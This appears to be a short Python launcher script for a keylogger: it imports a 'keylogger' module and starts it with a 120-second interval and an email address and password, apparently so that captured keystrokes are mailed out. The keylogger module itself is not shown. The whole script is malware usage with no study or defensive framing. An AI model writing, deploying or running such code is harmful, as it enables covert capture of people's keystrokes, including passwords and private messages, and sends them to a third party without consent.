#!/usr/bin/env python
import keylogger

kl = keylogger.Keylogger(120, "sample@gmail.com", "password")
kl.start()